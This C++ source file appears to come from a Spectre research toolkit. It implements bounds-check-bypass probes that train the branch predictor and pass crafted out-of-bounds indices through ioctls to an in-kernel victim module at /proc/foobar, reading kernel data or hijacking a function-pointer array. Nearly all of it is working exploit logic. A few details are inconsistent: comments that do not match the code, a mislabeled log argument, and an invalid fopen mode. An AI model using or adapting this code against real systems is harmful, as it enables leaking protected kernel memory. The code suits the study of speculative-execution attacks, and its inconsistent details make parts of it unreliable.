#include "spectre_kernel.h"
#include <string>
#include <string.h>
#include <errno.h>
#include <sys/ioctl.h>

#define IOCTL_BOUND_CHECK_BYPASS _IOWR('S', 'b', struct bound_check_bypass_request *)
#define IOCTL_FUNCTION_ARRAY     _IOWR('S', 'f', struct function_array_request *)

void spectre::KernelBase::before() {
    this->file = fopen("/proc/foobar", "rw");
    if (this->file == nullptr)
        throw std::string("Cannot open /proc/foobar: ") + strerror(errno);

    int ret = 0;
    ret += fscanf(this->file, " function_array=%p", &this->function_array);
    ret += fscanf(this->file, " function_array_size=%zd", &this->function_array_size);
    ret += fscanf(this->file, " function_array_size_ptr=%p", &this->function_array_size_ptr);
    ret += fscanf(this->file, " phys_to_virt=%p", &this->phys_to_virt);

    if (ret != 4) {
        after();
        throw std::string("Failed to parse pointers from /proc/foobar");
    }

    LOG("Using foobar module: function_array=%p, function_array_size=%zd, phys_to_virt=%p", this->function_array, this->function_array_size, this->function_array_size_ptr);
}

void spectre::KernelBase::after() {
    fclose(this->file);
    this->file = nullptr;

    this->function_array = nullptr;
    this->function_array_size = 0;
    this->function_array_size_ptr = nullptr;
    this->phys_to_virt = nullptr;
}



struct FoobarIoctl1 {
    spectre::DataArray *data;
    const uint8_t *cache_probe;
    uint8_t mask;
    size_t index;
};

struct FoobarIoctl2 {
    size_t function_index;
    uint8_t arg1;
    const void *arg2;
    const void *arg3;
};


void spectre::KernelDataArrayBoundCheckBypass::probe_bit(uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
    size_t malicious_index = data - this->data_array.array;
    size_t max_training_index = this->data_array.array_size;

    for (int i = 9; i >= 0; i--) {
        size_t training_index = (mask + i) % max_training_index;
        libflush.flush(&this->data_array.array_size);
        fence();

        // Bit twiddling to set index=training_index if i%6!=0 or malicious_x if i%6==0
        // Avoid jumps in case those tip off the branch predictor
        size_t index = ((i % 10) - 1) & ~0xFFFF;  // Set index=FFF.FF0000 if i%6==0, else index=0
        index = (index | (index >> 16));  // Set index=-1 if i&6=0, else index=0
        index = training_index ^ (index & (malicious_index ^ training_index));


        /* Call the in-kernel victim! */
        FoobarIoctl1 ioctl_request = {
            .data = &this->data_array,
            .cache_probe = cache_probe,
            .mask = mask,
            .index = index
        };
        ioctl(fileno(this->file), IOCTL_BOUND_CHECK_BYPASS, &ioctl_request);
    }
}


void spectre::KernelFunctionArrayBoundCheckBypass::probe_bit(uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
    FunctionArray::function_ptr_t fake_array[] = {
        FunctionArrayBoundCheckBypass::exploit
    };

    size_t malicious_index = fake_array - this->function_array;
    size_t max_training_index = this->function_array_size;

    for (int i = 9; i >= 0; i--) {
        size_t training_index = (mask + i) % max_training_index;
        libflush.flush(&this->function_array_size);
        fence();

        // Bit twiddling to set index=training_index if i%6!=0 or malicious_x if i%6==0
        // Avoid jumps in case those tip off the branch predictor
        size_t index = ((i % 10) - 1) & ~0xFFFF;  // Set index=FFF.FF0000 if i%6==0, else index=0
        index = (index | (index >> 16));  // Set index=-1 if i&6=0, else index=0
        index = training_index ^ (index & (malicious_index ^ training_index));


        /* Call the in-kernel victim! */
        FoobarIoctl2 ioctl_request = {
            .function_index = index,
            .arg1 = mask,
            .arg2 = data,
            .arg3 = cache_probe
        };
        ioctl(fileno(this->file), IOCTL_FUNCTION_ARRAY, &ioctl_request);
    }
}
